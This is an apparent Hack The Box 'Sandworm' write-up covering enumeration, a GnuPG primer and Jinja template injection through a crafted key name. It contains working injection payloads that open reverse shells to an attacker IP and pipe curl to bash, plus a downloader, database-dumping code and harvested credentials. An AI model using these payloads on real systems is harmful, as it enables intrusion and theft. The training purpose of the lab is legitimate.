![sandworm.png](sandworm.png)

# Sandworm

## Enum
```bash
nmap -Pn -sC -sV 10.10.11.218 -oN scans/nmap.initial
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 10:28 IST
Nmap scan report for ssa.htb (10.10.11.218)
Host is up (0.035s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-title: Secret Spy Agency | Secret Security Service
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.87 seconds
```

![cert.png](cert.png)  
![flask.png](flask.png)  
![wap.png](wap.png)  

```bash
dirsearch -r -u https://ssa.htb -b

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/ssa.htb/_23-07-15_11-54-48.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-23-07-15_11-54-48.log

Target: https://ssa.htb/

[11:54:48] Starting:
[11:54:55] 200 -    5KB - /about
[11:54:56] 302 -  227B  - /admin  ->  /login?next=%2Fadmin
[11:55:05] 200 -    3KB - /contact
[11:55:10] 200 -    9KB - /guide
[11:55:14] 200 -    4KB - /login
[11:55:14] 302 -  229B  - /logout  ->  /login?next=%2Flogout

Task Completed
```
```
ffuf \
  -c \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u "http://ssa.htb" \
  -H "Host: FUZZ.ssa.htb" -mc all -fs 178

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://ssa.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.ssa.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 178
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 1324 req/sec :: Duration: [0:01:31] :: Errors: 0 ::
```

## Getting familiar with GnuPG

This [guide](https://www.digitalocean.com/community/tutorials/how-to-use-gpg-to-encrypt-and-sign-messages) from Digital Ocean about gnuPG is really nice.   
The [GNU Privacy Handbook](https://www.gnupg.org/gph/en/manual.html#AEN136) is also a great resource.  
This [cheat-sheet](https://devhints.io/gnupg) is also great.   

Generate a keypair
```bash
gpg --gen-key
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: blnkn
Email address: blnkn@sandworm.htb
You selected this USER-ID:
    "blnkn <blnkn@sandworm.htb>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit?
Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: /home/blnkn/.gnupg/trustdb.gpg: trustdb created
gpg: directory '/home/blnkn/.gnupg/openpgp-revocs.d' created
gpg: revocation certificate stored as '/home/blnkn/.gnupg/openpgp-revocs.d/3E0ED404FC30D01F56FC0425E75A8F380717134E.rev'
public and secret key created and signed.

pub   rsa3072 2023-07-15 [SC] [expires: 2025-07-14]
      3E0ED404FC30D01F56FC0425E75A8F380717134E
uid                      blnkn <blnkn@sandworm.htb>
sub   rsa3072 2023-07-15 [E] [expires: 2025-07-14]
```

Generate a revocation cert for he key
```bash
gpg --output ~/revocation.crt --gen-revoke blnk
n@sandworm.htb

sec  rsa3072/E75A8F380717134E 2023-07-15 blnkn <blnkn@sandworm.htb>

Create a revocation certificate for this key? (y/N) y
Please select the reason for the revocation:
  0 = No reason specified
  1 = Key has been compromised
  2 = Key is superseded
  3 = Key is no longer used
  Q = Cancel
(Probably you want to select 1 here)
Your decision? 1
Enter an optional description; end it with an empty line:
>
Reason for revocation: Key has been compromised
(No description given)
Is this okay? (y/N) y
ASCII armored output forced.
Revocation certificate created.

Please move it to a medium which you can hide away; if Mallory gets
access to this certificate he can use it to make your key unusable.
It is smart to print this certificate and store it away, just in case
your media become unreadable.  But have some caution:  The print system of
your machine might store the data and make it available to others!
```

Import someone else's public key
```bash
gpg --import ssa-public-key.pem
gpg: key C61D429110B625D4: public key "SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>" imported
gpg: Total number processed: 1
gpg:               imported: 1
```

Search pubkeys in [https://pgp.mit.edu](https://pgp.mit.edu)  
```bash
gpg --keyserver pgp.mit.edu  --search-keys search_parameters
```

Get the fingerprint of a public key
```bash
gpg --fingerprint blnkn@sandworm.htb
gpg: checking the trustdb
gpg: marginals needed: 3  completes needed: 1  trust model: pgp
gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
gpg: next trustdb check due at 2025-07-14
pub   rsa3072 2023-07-15 [SC] [expires: 2025-07-14]
      3E0E D404 FC30 D01F 56FC  0425 E75A 8F38 0717 134E
uid           [ultimate] blnkn <blnkn@sandworm.htb>
sub   rsa3072 2023-07-15 [E] [expires: 2025-07-14]
```

List keys
```bash
gpg -k
/home/blnkn/.gnupg/pubring.kbx
------------------------------
pub   rsa3072 2023-07-15 [SC] [expires: 2025-07-14]
      3E0ED404FC30D01F56FC0425E75A8F380717134E
uid           [ultimate] blnkn <blnkn@sandworm.htb>
sub   rsa3072 2023-07-15 [E] [expires: 2025-07-14]

pub   rsa4096 2023-05-04 [SC]
      D6BA9423021A0839CCC6F3C8C61D429110B625D4
uid           [ unknown] SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>
sub   rsa4096 2023-05-04 [E]
```

List keys in more details
```bash
tru::1:1689415135:1752486565:3:1:5
pub:u:3072:1:E75A8F380717134E:1689414565:1752486565::u:::scESC::::::23::0:
fpr:::::::::3E0ED404FC30D01F56FC0425E75A8F380717134E:
uid:u::::1689414565::8A7278635842F645951E5434A565A843ACD4FE22::blnkn <blnkn@sandworm.htb>::::::::::0:
sub:u:3072:1:B916376F84DF69F4:1689414565:1752486565:::::e::::::23:
fpr:::::::::37A9A7A98617891FD0377D0BB916376F84DF69F4:
pub:-:4096:1:C61D429110B625D4:1683214246:::-:::scESC::::::23::0:
fpr:::::::::D6BA9423021A0839CCC6F3C8C61D429110B625D4:
uid:-::::1683214246::FF7FAADA6532A2C79EBA916DC88659011E14437D::SSA (Official PGP Key of the Secret Spy Agency.) <atlas@ssa.htb>::::::::::0:
sub:-:4096:1:6BB733D928D14CE6:1683214246::::::e::::::23:
fpr:::::::::4BADE0AEB5F550806083D5AC6BB733D928D14CE6:
```

Export a pub-key
```bash
gpg --output blnkn-pub.gpg --export blnkn@sandworm.htb --armor
```
```bash
cat blnkn-pub.gpg
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
n77mVcfac9OX3ElHKquN3Qfs
=raL0
-----END PGP PUBLIC KEY BLOCK-----
```


Encrypt a message for atlas
```bash
gpg -r atlas@ssa.htb --encrypt --armor secret-message.txt
```
```bash
cat secret-message.txt.asc
-----BEGIN PGP MESSAGE-----

hQIMA2u3M9ko0UzmARAAoQhgWMWVjv77O2+wXwt4nzbwu/vogiTPhGtuk+PHyvXW
PRZz4LsXLXIZS2yxQaipA43BI5t447x+mltM8m35P25bJT0VzbR1a1PHsmR9qaZu
/lt/0bHCwaUcUMLxGKadM5wDCplb9ehAVi6q54SgdrQFiDSlxs3RzznQTJS6tYQe
Ke3JWEqsaVcUtsLDG3JSIPNaF6P3fR4y8edkKnzNkZcaYvJknZFT7yOHAUQoIjWU
Q8vrWlUvkeSINJgTGxFxhZihO/UVhdxdKbh9Yn1kmVWIx/xJd39CL0Txnrcf3aXx
qbO/Qr5qT1+RhSGIbziQEVSklvy9azOTF35clnaDpF2XL5cTTq/iNVkq71Xv1XU/
D7GRSPnrl7LEHpuIVr0sWWVE0PIOICFWFPcF8kdTJuJQXqj1xWo1yf/SzH1p9KqX
22dZvB2RgJhASeoXcyoBQaksXe8yqpKcPjV9jLRm8LXc6py+5WoFUnoBlxkhxAPr
MwpH7LY7cAPOBRuE2bvzwwZ1I+YJv4WBxDK/J6Eh09H4dyP3E0TRgvBLPxKlE9Um
NPf1wCSCeCCouL/jW6M0PFAfmffh8HEfZ4Mm4sfbxsPwCdW8jZXDAdsf9A+0Z5y6
lU69PghDHy+1off+6OKUPduKuf8HP4T0Ex6Hgb+dJD1VUZWWl6dhyKwD/zHh+yjS
jwEG/ODt3EI1SYIPXbE+s2afdTEKEx0NXAlFK0Zh/DjbwLS/69UtfdDUTBku7ovh
2TZrH7xTsRNHSTCV2nMQBUIBGsxtwSVBrVOjhGj6s8vfC2zGWjgUFj5rCUx9V2z+
l3PKUN0RcKNzH+BooU3cIyPojRLumUnDcpn1dj5FeAKk4pJ9MP5TBYSfrmbkU/be
=THWb
-----END PGP MESSAGE-----
```

Clearsign a document with your own priv-key for anyone to verify
```bash
gpg --clearsign secret-message.txt
```
```bash
cat secret-message.txt.asc
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Secret semechki stash location: 69.10102232215594, 33.44235905808057
-----BEGIN PGP SIGNATURE-----

iQGzBAEBCgAdFiEEPg7UBPww0B9W/AQl51qPOAcXE04FAmSycmUACgkQ51qPOAcX
E057agwAldCZM7W+42eKiqbamDt7q7yObLM9fH7l6Sluc6EBmJdDmfFuj7BXgO0b
Df5LyLC5b3V5uxwHozolJTb/0hywnCokaLRmAZc3R/wX+RrdH9xMAlqdHTzkAwzj
EXfsD95sNhHD8MRMcom+R5EKeTPz+FR6jAw9V78Ebvos6DVrG8CO05KpHve0far3
IpDVcMTW9vsxHanuGAbIvXqY/7Q8ENotSyZ+cybbrhNPuhlUJG+ZezqcpS6sqqe3
9DDEkHmuRxx6KKCVxFuYfwdqdRRVzdWux9FoNz87/Ao1EExNNDnv37hVMS75MHL6
17IgS7kHbOO68C8CMCdEOsNJdiWUGJ8jDjw/oxfgZfVZ+TPMRjvosRGuYmoAPbHg
SRrb4hUHwRVfWfLxiDbj2K0KLCM6R/jlEDXl2S418zaVYDBeLsFP/ULigu2y8Ilc
SzfQ2+Q+Zzz6D9ETq8KNXJovZqcnmvAYbJsz3PbiW64nAsYHSXojYrFjI4+sEj+Y
nJnpqg3f
=stNp
-----END PGP SIGNATURE-----
```

## SSTI

In the `Verfify Signature` section of [https://ssa.htb/guide](https://ssa.htb/guide), once provided with a valid Clearsign signature and the corresponding pub-key, the web-app returns a message parsed by the flask app, to confirm that the signature is valid. In that message we can see that the UID of the key is displayed, we control that UID since we created the key ourselves, and because this is Flask, The templating engine is likely Jinja, so, let's try to do SSTI from the UID of the key.

Generating a new key-pair with a name of {{ 7 * 7 }}
```bash
gpg --gen-key                          2 ⨯
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: {{ 7 * 7 }}
Email address:
You selected this USER-ID:
    "{{ 7 * 7 }}"

Change (N)ame, (E)mail, or (O)kay/(Q)uit?
Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: revocation certificate stored as '/home/blnkn/.gnupg/openpgp-revocs.d/1A8F692F3DA436FF0E8119FE550AF70682324573.rev'
public and secret key created and signed.

pub   rsa3072 2023-07-15 [SC] [expires: 2025-07-14]
      1A8F692F3DA436FF0E8119FE550AF70682324573
uid                      {{ 7 * 7 }}
sub   rsa3072 2023-07-15 [E] [expires: 2025-07-14]
```
Exporting the pubkey to a text file
```bash
gpg --output ssti-pub.gpg --export --armor 1A8F692F3DA436FF0E8119FE550AF70682324573
```

Clearsigning a message with that key
```bash
gpg -u '{{ 7 * 7 }}' --clearsign secret-message.txt
File 'secret-message.txt.asc' exists. Overwrite? (y/N) y
```
```bash
cat secret-message.txt.asc
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Secret semechki stash location: 69.10102232215594, 33.44235905808057
-----BEGIN PGP SIGNATURE-----

iQGzBAEBCgAdFiEEGo9pLz2kNv8OgRn+VQr3BoIyRXMFAmSyg2MACgkQVQr3BoIy
RXOolgv/Y+FEb+EpL9Mf8GBKfwm/L4th6CZh7oHM0LPPnJmt8OJwH76Lyf2fYtpN
StmUZWhe4vqZb1hDjxojRqFgZp22WYAs9v0ujl9X/KvyBoGzPvfWP/ReZp37TIl0
+YbhEJ/kWPoxyua9jUrW6fXMIuBby58zzSvzuq9DEUsFrdrITz5Ag8IPjZ+tPcd9
OXvpeJyKWjddCNzNgSrifFTRxKHUCVrIJCuzwoOudjM5478R6csT2PBrm5BCVvZ6
38TE3oMeV9TsDAuesjeRfBrNWUsFhegDWZbtyP7unfcmKmoPmHYSAcbv12gZ1KUc
LILUFVY0MFmcb/TXgHsVvTYolVcbDVb1eXcKb9NHkFSOU1bZ7S16VwOQHQ1o2NEo
GW7fFHDR3oF3dcAtJqZ2oz1t7tBf4i4Q/1a4hlpXigtNtxHtBGor3ORuWBpwK4D4
8c02Fse1ZXYiFedEL6s21sJMO1IlGaBppG9ZKiwacFphKrLAkomgAKWhzOJZ04Pu
lRS+E90s
=3TWE
-----END PGP SIGNATURE-----
```
```bash
gpg --verify secret-message.txt.asc
gpg: Signature made Sat 15 Jul 2023 12:30:43 PM IST
gpg:                using RSA key 1A8F692F3DA436FF0E8119FE550AF70682324573
gpg: Good signature from "{{ 7 * 7 }}" [ultimate]
gpg: WARNING: not a detached signature; file 'secret-message.txt' was NOT verified!
```

And there is an SSTI indeed:
![ssti.png](ssti.png)  


Trying to find the index of subprocess.Popen with slicing, and then tried a few things to get a shell
```
0  {{''.__class__.mro()[1].__subclasses__()}}
1  {{''.__class__.mro()[1].__subclasses__()[200:]}}
2  {{''.__class__.mro()[1].__subclasses__()[400:]}}
3  {{''.__class__.mro()[1].__subclasses__()[500:]}}
4  {{''.__class__.mro()[1].__subclasses__()[450:]}}
5  {{''.__class__.mro()[1].__subclasses__()[420:]}}
6  {{''.__class__.mro()[1].__subclasses__()[445:]}}
7  {{''.__class__.mro()[1].__subclasses__()[448].__name__}}
8  {{''.__class__.mro()[1].__subclasses__()[449].__name__}}
9  {{''.__class__.mro()[1].__subclasses__()[447].__name__}}
10 {{''.__class__.mro()[1].__subclasses__()[300:]}}
11 {{''.__class__.mro()[1].__subclasses__()[435:]}}
12 {{''.__class__.mro()[1].__subclasses__()[440:]}}
13 {{''.__class__.mro()[1].__subclasses__()[438:]}}
14 {{''.__class__.mro()[1].__subclasses__()[439].__name__}}
15 {{''.__class__.mro()[1].__subclasses__()[439]('id',shell=True,stdout=-1).communicate()[0].strip()}}
16 {{''.__class__.mro()[1].__subclasses__()[439]("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.52\",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'",shell=True,stdout=-1).communicate()[0].strip()}}
17 {{''.__class__.mro()[1].__subclasses__()[439]('nc 10.10.14.52 4242 -e sh',shell=True,stdout=-1).communicate()[0].strip()}}
18 {{''.__class__.mro()[1].__subclasses__()[439]('which nc',shell=True,stdout=-1).communicate()[0].strip()}}
19 {{''.__class__.mro()[1].__subclasses__()[439]("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.52\",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'",shell=True,stdout=-1).communicate()[0].strip()}}
20 {{''.__class__.mro()[1].__subclasses__()[439]("pwd",shell=True,stdout=-1).communicate()[0].strip()}}
21 {{''.__class__.mro()[1].__subclasses__()[439]("curl http://10.10.14.52:9090/notashell.sh|bash",shell=True,stdout=-1).communicate()[0].strip()}}
22 {{''.__class__.mro()[1].__subclasses__()[439]("printf 'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjUyIiw0MjQyKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKQ=='|base64 -d|python3",shell=True,stdout=-1).communicate()[0].strip()}}
```

Once I got a shell, I could explore the app so see how the login works so that we can access that admin portal maybe? 

in `app.py`
```python
@main.route("/login", methods=('GET', 'POST'))
def login():
    if request.method == 'GET':
        return render_template("login.html", name="login")

    uname = request.form['username']
    pwd = request.form['password']

    user = User.query.filter_by(username=uname).first()

    if not user or not check_password_hash(user.password, pwd):
        flash('Invalid credentials.')
        return redirect(url_for('main.login'))

    login_user(user, remember=True)

    return redirect(url_for('main.admin'))
```

`models.py`
```python
from . import db
from flask_login import UserMixin

class User(db.Model, UserMixin):
    __tablename__ = 'users'
    id = db.Column(db.Integer, primary_key=True)
    password = db.Column(db.String(100))
    username = db.Column(db.String(1000))

```

`__init__.py`
```python
from flask import Flask
from flask_login import LoginManager
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()

def create_app():
    app = Flask(__name__)

    app.config['SECRET_KEY'] = '91668c1bc67132e3dcfb5b1a3e0c5c21'
    app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'

    db.init_app(app)

    # blueprint for non-auth parts of app
    from .app import main as main_blueprint
    app.register_blueprint(main_blueprint)

    login_manager = LoginManager()
    login_manager.login_view = "main.login"
    login_manager.init_app(app)

    from .models import User
    @login_manager.user_loader
    def load_user(user_id):
        return User.query.get(int(user_id))

    return app
```

We don't have the mysql bin local, and we also don't have curl nor netcat, so I'm writing a little, http client in python to get chisel in the box 
```python
import requests
res = requests.get("https://10.10.14.52:9090/chisel-amd", verify=False)
with open("/dev/shm/chisel-amd", "wb") as f:
    f.write(res.content)
```

Oh, wow, there isn't even chmod, there's nothing in here really:
```bash
atlas@sandworm:/bin$ ls -la
ls -la
total 14304
drwxr-xr-x  2 nobody nogroup     340 Jul 15 13:43 .
drwxr-xr-x 14 nobody nogroup    4096 Jun  6 11:49 ..
-rwxr-xr-x  1 nobody nogroup   35328 Jul 15 13:43 base64
-rwxr-xr-x  1 nobody nogroup   35328 Jul 15 13:43 basename
-rwxr-xr-x  1 nobody nogroup 1396520 Jul 15 13:43 bash
-rwxr-xr-x  1 nobody nogroup   35280 Jul 15 13:43 cat
-rwxr-xr-x  1 nobody nogroup  125688 Jul 15 13:43 dash
-rwxr-xr-x  1 nobody nogroup     948 Jul 15 13:43 flask
-rwxr-xr-x  1 nobody nogroup 4898752 Jul 15 13:43 gpg
-rwxr-xr-x  1 nobody nogroup 1960456 Jul 15 13:43 gpg-agent
-rwxr-xr-x  1 nobody nogroup   35328 Jul 15 13:43 groups
-rwxr-xr-x  1 nobody nogroup   39424 Jul 15 13:43 id
-rwxr-xr-x  1 nobody nogroup    9047 Jul 15 13:43 lesspipe
-rwxr-xr-x  1 nobody nogroup  138208 Jul 15 13:43 ls
lrwxrwxrwx  1 nobody nogroup      19 Jul 15 13:43 python3 -> /usr/bin/python3.10
-rwxr-xr-x  1 nobody nogroup 5912968 Jul 15 13:43 python3.10
lrwxrwxrwx  1 nobody nogroup      13 Jul 15 13:43 sh -> /usr/bin/dash
```

And the file-system is read-only too.
```bash
atlas@sandworm:~$ echo adfad > file
echo adfad > file
bash: file: Read-only file system
```
```bash
cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04.2 LTS"
PRETTY_NAME="Ubuntu 22.04.2 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.2 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

Trying to chmod from python
```
    stat.S_ISUID − Set user ID on execution.
    stat.S_ISGID − Set group ID on execution.
    stat.S_ENFMT − Record locking enforced.
    stat.S_ISVTX − Save text image after execution.
    stat.S_IREAD − Read by owner.
    stat.S_IWRITE − Write by owner.
    stat.S_IEXEC − Execute by owner.
    stat.S_IRWXU − Read, write, and execute by owner.
    stat.S_IRUSR − Read by owner.
    stat.S_IWUSR − Write by owner.
    stat.S_IXUSR − Execute by owner.
    stat.S_IRWXG − Read, write, and execute by group.
    stat.S_IRGRP − Read by group.
    stat.S_IWGRP − Write by group.
    stat.S_IXGRP − Execute by group.
    stat.S_IRWXO − Read, write, and execute by others.
    stat.S_IROTH − Read by others.
    stat.S_IWOTH − Write by others.
    stat.S_IXOTH − Execute by others.
```

```python
import os, sys, stat
os.chmod("/dev/shm/chisel-amd", stat.S_IXUSR)
```

But it looks like we don't have permissions to do that either
```bash
$ python3 chmod.py
python3 chmod.py
Traceback (most recent call last):
  File "/dev/shm/chmod.py", line 2, in <module>
    os.chmod("/dev/shm/chisel-amd", stat.S_IXUSR)
PermissionError: [Errno 1] Operation not permitted: '/dev/shm/chisel-amd'
```

Trying to read the content of the user table directly from sqlalchemy
```python
from sqlalchemy import create_engine
from sqlalchemy import select
from sqlalchemy import MetaData

user = "atlas"
password = "GarlicAndOnionZ42"
host = "127.0.0.1"
port = "3306"
database = "SSA"

engine = create_engine(
    url="mysql://{0}:{1}@{2}:{3}/{4}".format(
        user, password, host, port, database
    )
)

meta = MetaData()
meta.reflect(bind=engine)
user_table = meta.tables["users"]

conn = engine.connect()
result = conn.execute(user_table.select())

for row in result:
    print(row)
```

```bash
atlas@sandworm:/dev/shm$ python3 exploit.py
python3 exploit.py
(1, 'Odin', 'pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f')
(2, 'silentobserver', 'pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d')
```

Starting hashcat in the background
```bash
cat hashes.txt
sha256:260000:q0WZMG27Qb6XwVlZ:12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f
sha256:260000:kGd27QSYRsOtk7Zi:0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d
```

```bash
hashcat -a0 hashes.txt /usr/share/wordlists/rockyou.txt
```

In the meantime there is this in the user directory of `atlas`
```bash
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json
cat admin.json
```
```json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
